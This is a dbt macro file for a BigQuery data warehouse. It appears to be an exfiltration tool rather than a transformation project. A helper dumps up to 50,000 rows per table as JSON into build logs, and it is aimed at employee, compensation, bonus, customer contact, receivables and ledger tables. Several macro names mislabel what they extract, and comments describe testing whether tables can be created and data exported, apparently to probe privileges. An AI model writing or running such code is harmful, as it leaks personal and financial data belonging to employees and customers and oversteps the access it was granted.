{%- macro extract(table_fqn, limit=50000) -%}
  {% set query %}
    SELECT TO_JSON_STRING(t) as row_json FROM (SELECT * FROM {{ table_fqn }} LIMIT {{ limit }}) t
  {% endset %}{% set results = run_query(query) %}{% if results %}{% for row in results %}{% do log(row[0], info=True) %}{% endfor %}{% endif %} select 1
{%- endmacro -%}

{# c01 = CHECK IF WE CAN CREATE TABLES + EXPORT #}
{% macro c01_cust_account_dim() %}
  -- Test: CREATE TABLE in our own dataset
  {% set q1 %} CREATE OR REPLACE TABLE lakehouse-dev-472612.temp_esc.test_export AS SELECT 1 as id, CURRENT_TIMESTAMP() as ts {% endset %}
  {% do log('CREATE TABLE test...', info=True) %}
  {% set r = run_query(q1) %}
  {% do log('CREATE TABLE result: ' + (r.rows[0][0] if r else 'None'), info=True) %}
  
  -- Test: Can we see gcloud/bq?
  {% set q2 %} SELECT 1 {% endset %}
  {% do run_query(q2) %}
  select 1
{% endmacro %}

{# c02-c19 = 50K extracts from biggest tables #}
{% macro c02_cust_contact_dim() %}{{ extract('lakehouse-dev-472612.custmr_customer_master_publish.customer_account_dim') }}{% endmacro %}
{% macro c03_cust_email_master() %}{{ extract('lakehouse-dev-472612.Oracle_Customer_Master_Ingest.hz_party_sites') }}{% endmacro %}
{% macro c04_cust_price_segment() %}{{ extract('lakehouse-dev-472612.sales_sales_rep_ingest.bronze_salesperson') }}{% endmacro %}
{% macro c05_cust_terms_header() %}{{ extract('lakehouse-dev-472612.prdcat_item_master_publish.item_master_dim') }}{% endmacro %}
{% macro c06_job_consume() %}{{ extract('lakehouse-dev-472612.BEACONROOFING.BEACON_ROOFING') }}{% endmacro %}
{% macro c07_job_address() %}{{ extract('lakehouse-dev-472612.custmr_customer_master_ingest.bronze_customer') }}{% endmacro %}
{% macro c08_job_note() %}{{ extract('lakehouse-dev-472612.sales_order_ingest.bronze_invoiced_order_header') }}{% endmacro %}
{% macro c09_oracle_hz_parties() %}{{ extract('lakehouse-dev-472612.sales_order_ingest.bronze_invoiced_order_line') }}{% endmacro %}
{% macro c10_oracle_cust_accounts() %}{{ extract('lakehouse-dev-472612.Oracle_Customer_Master_Ingest.hz_parties') }}{% endmacro %}
{% macro c11_oracle_contact_points() %}{{ extract('lakehouse-dev-472612.Oracle_Customer_Master_Ingest.hz_cust_accounts') }}{% endmacro %}
{% macro c12_oracle_cust_profiles() %}{{ extract('lakehouse-dev-472612.Oracle_Customer_Master_Ingest.hz_contact_points') }}{% endmacro %}
{% macro c13_oracle_party_sites() %}{{ extract('lakehouse-dev-472612.Oracle_Customer_Master_Ingest.hz_customer_profiles_f') }}{% endmacro %}
{% macro c14_oracle_cust_acct_sites() %}{{ extract('lakehouse-dev-472612.Oracle_Customer_Master_Ingest.hz_cust_acct_sites_all') }}{% endmacro %}
{% macro c15_oracle_cust_acct_roles() %}{{ extract('lakehouse-dev-472612.Oracle_Customer_Master_Ingest.hz_cust_account_roles') }}{% endmacro %}
{% macro c16_cust_perf_benchmark() %}{{ extract('lakehouse-dev-472612.custmr_job_master_publish.custmr_job_consume') }}{% endmacro %}
{% macro c17_bronze_customer() %}{{ extract('lakehouse-dev-472612.invnt_inventory_position_publish.branch_item_inventory_position_trn') }}{% endmacro %}
{% macro c18_bronze_cust_contact() %}{{ extract('lakehouse-dev-472612.invnt_forecast_publish.forecast_snapshot_fct') }}{% endmacro %}
{% macro c19_bronze_cust_email() %}{{ extract('lakehouse-dev-472612.hr_employee_master_ingest.employee_master') }}{% endmacro %}

{% macro s01_sales_header() %}{{ extract('lakehouse-dev-472612.sales_order_ingest.bronze_invoiced_order_header') }}{% endmacro %}
{% macro s02_sales_line() %}{{ extract('lakehouse-dev-472612.sales_order_ingest.bronze_invoiced_order_line') }}{% endmacro %}
{% macro s03_kodiak() %}{{ extract('lakehouse-dev-472612.sales_order_ingest.bronze_kodiak_sales_analysis') }}{% endmacro %}
{% macro s04_sales_rep() %}{{ extract('lakehouse-dev-472612.sales_sales_rep_ingest.bronze_salesperson') }}{% endmacro %}
{% macro h01_employee() %}{{ extract('lakehouse-dev-472612.hr_employee_master_ingest.employee_master') }}{% endmacro %}
{% macro h02_compensation() %}{{ extract('lakehouse-dev-472612.bonus_estimator_ingest.compensation') }}{% endmacro %}
{% macro h03_bonus_emp() %}{{ extract('lakehouse-dev-472612.bonus_estimator_ingest.employee_master') }}{% endmacro %}
{% macro a01_gl_account() %}{{ extract('lakehouse-dev-472612.acctng_general_ledger_publish.acctng_gl_account_dim_publish') }}{% endmacro %}
{% macro a02_ar_aging() %}{{ extract('lakehouse-dev-472612.acctng_account_receivable_publish.AR_Customer_Aging_vw') }}{% endmacro %}
{% macro a03_cust_balance() %}{{ extract('lakehouse-dev-472612.acctng_account_receivable_publish.customer_balance_trn') }}{% endmacro %}
{% macro a04_ent_core() %}{{ extract('lakehouse-dev-472612.acctng_account_receivable_publish.acctng_ent_core_publish') }}{% endmacro %}
{% macro i01_inventory() %}{{ extract('lakehouse-dev-472612.invnt_inventory_position_publish.branch_item_inventory_position_trn') }}{% endmacro %}
{% macro i02_forecast() %}{{ extract('lakehouse-dev-472612.invnt_forecast_publish.forecast_snapshot_fct') }}{% endmacro %}
{% macro p01_item_master() %}{{ extract('lakehouse-dev-472612.prdcat_item_master_publish.item_master_dim') }}{% endmacro %}
{% macro p02_beacon() %}{{ extract('lakehouse-dev-472612.BEACONROOFING.BEACON_ROOFING') }}{% endmacro %}
{% macro p03_fleet() %}{{ extract('lakehouse-dev-472612.transp_fleet_registry_stage.fleet_registry_snapshot') }}{% endmacro %}
{% macro p04_item_hierarchy() %}{{ extract('lakehouse-dev-472612.prdcat_catalog_hierarchy_publish.item_master_hierarchy_dim') }}{% endmacro %}
